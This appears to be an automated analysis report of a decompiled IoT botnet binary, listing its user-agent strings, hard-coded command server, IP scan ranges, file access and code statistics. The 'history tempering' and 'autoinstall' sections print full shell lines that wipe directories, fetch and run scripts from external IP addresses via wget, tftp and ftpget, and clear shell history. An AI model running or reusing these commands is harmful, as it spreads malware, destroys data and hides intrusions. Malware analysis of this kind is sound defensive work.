Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
185.158.113.30:77
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
43.252.%d.%d
43.239.%d.%d
85.3.%d.%d
37.158.%d.%d
95.9.%d.%d
41.252.%d.%d
58.71.%d.%d
104.55.%d.%d
78.186.%d.%d
78.189.%d.%d
77.209.%d.%d
88.5.%d.%d
103.20.%d.%d
103.47.%d.%d
103.57.%d.%d
45.117.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
14.204.%d.%d
27.0.%d.%d
27.8.%d.%d
27.50.%d.%d
27.54.%d.%d
27.98.%d.%d
27.112.%d.%d
27.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
60.0.%d.%d
60.16.%d.%d
163.53.%d.%d
62.30.%d.%d
62.252.%d.%d
62.254.%d.%d
62.255.%d.%d
77.96.%d.%d
77.97.%d.%d
77.98.%d.%d
77.100.%d.%d
77.102.%d.%d
113.191.%d.%d
81.100.%d.%d
113.188.%d.%d
113.189.%d.%d
94.174.%d.%d
14.160.%d.%d
14.161.%d.%d
14.162.%d.%d
14.163.%d.%d
14.164.%d.%d
14.165.%d.%d
14.166.%d.%d
14.167.%d.%d
14.168.%d.%d
14.169.%d.%d
14.170.%d.%d
14.171.%d.%d
14.172.%d.%d
14.173.%d.%d
14.174.%d.%d
14.175.%d.%d
14.176.%d.%d
14.177.%d.%d
14.178.%d.%d
14.179.%d.%d
14.180.%d.%d
14.181.%d.%d
14.182.%d.%d
14.183.%d.%d
14.184.%d.%d
14.185.%d.%d
14.186.%d.%d
14.187.%d.%d
14.188.%d.%d
14.189.%d.%d
14.190.%d.%d
14.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.230.%d.%d
43.240.%d.%d
43.245.%d.%d
41.174.%d.%d
49.118.%d.%d
78.188.%d.%d
45.127.%d.%d
103.30.%d.%d
14.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
41.253.%d.%d
117.173.%d.%d
113.190.%d.%d
146.88.%d.%d
112.196.%d.%d
113.178.%d.%d
112.45.%d.%d
183.223.%d.%d
%d.%d.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
cd /root;rm -rf .bash_history
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c
ClearHistory
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
 cd /var/; rm -rf cuntysshd; wget http://64.137.253.50/cuntysshd || tftp -r cuntysshd -g 64.137.253.50; chmod 777 cuntysshd; ./cuntysshd; rm -rf cuntysshd
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 87097
+++TOTAL FUNCTIONS 			:262
+++LINES PER FUNCTION RATIO 	: 332.431297709924
+++SUSPECTED LINES COUNT 	: 1724
+++SUSPECTED LINES RATIO 	: 1.97940227562373
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 87097
+++WHILE (TRUE) LINES			: 11924
+++WHILE (TRUE) LINES RATION		:13.6904830246736%
+++WHILE (TRUE) LOOPS COUNT		: 245
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/",
        "/opt/"
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v219 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001b6c
    int32_t v219 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001d88
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");
        int32_t v226 = __libc_open((int32_t)"/proc/net/route", 0); // 0x10009bf8
    int32_t v213 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x10009e7c
    char * v215 = "/etc/rc.d/rc.local";
        v214 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        v215 = "/etc/rc.conf";
                            int32_t v242 = __GI_fopen((int32_t)v215, (int32_t)&v241); // 0x10009ff0
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen(0, (char *)-1);
int32_t _stdio_fopen(int32_t a1, char * a2) {
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v220 = __libc_open((int32_t)"/dev/null", a2); // 0x1000f6b8
    int32_t v218 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v217); // 0x10011648
        int32_t v222 = __GI_fopen((int32_t)"/etc/config/resolv.conf", v221); // 0x10011660
    int32_t v220 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v219); // 0x10012c90
        result = __GI_fopen((int32_t)"/etc/config/hosts", v221);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",

        "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",

        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",

        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",

        "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",

        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",

        "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",

        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",

        "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",

        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",

        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",

        "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",

        "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",

    char (*v177)[18] = "185.158.113.30:77";

        szprintf((int32_t)&v221, (int32_t)"43.252.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"43.239.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"85.3.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"37.158.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"95.9.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"41.252.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"58.71.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"104.55.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"78.186.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"78.189.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"77.209.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"88.5.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"43.239.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"103.20.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"103.47.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"103.57.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"45.117.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"101.51.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"137.59.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"1.56.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"1.188.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.204.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"27.0.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"27.8.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"27.50.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"27.54.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"27.98.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"27.112.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"27.192.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"36.32.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"36.248.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"39.64.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"42.4.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"42.48.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"42.52.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"42.56.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"42.63.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"42.84.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"42.176.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"42.224.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"42.176.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"60.0.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"60.16.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"163.53.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"62.30.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"62.252.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"62.254.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"62.255.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"77.96.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"77.97.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"77.98.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"77.100.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"77.102.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"113.191.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"81.100.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"113.188.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"113.189.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"94.174.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.160.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.161.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.162.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.163.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.164.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.165.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.166.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.167.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.168.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.169.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.170.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.171.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.172.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.173.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.174.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.175.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.176.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.177.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.178.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.179.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.180.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.181.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.182.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.183.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.184.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.185.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.186.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.187.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.188.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.189.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.190.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"14.191.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"45.121.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"45.120.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"45.115.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"43.252.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"43.230.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"43.240.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"43.245.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"41.174.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"49.118.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"78.188.%d.%d", (int32_t)v218);

        szprintf((int32_t)&v221, (int32_t)"45.127.%d.%d", (int32_t)v218);

